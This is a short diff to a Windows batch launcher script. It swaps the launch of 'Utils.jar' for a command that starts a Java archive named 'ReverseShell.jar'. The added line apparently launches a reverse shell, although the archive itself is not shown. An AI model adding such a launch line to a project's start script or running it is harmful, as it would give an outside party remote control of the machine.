@@ -1,2 +1,2 @@
 @echo off
-start javaw -Xmx2g -jar src/Utils/Utils.jar
+start java -Xmx2g -jar jar/ReverseShell.jar
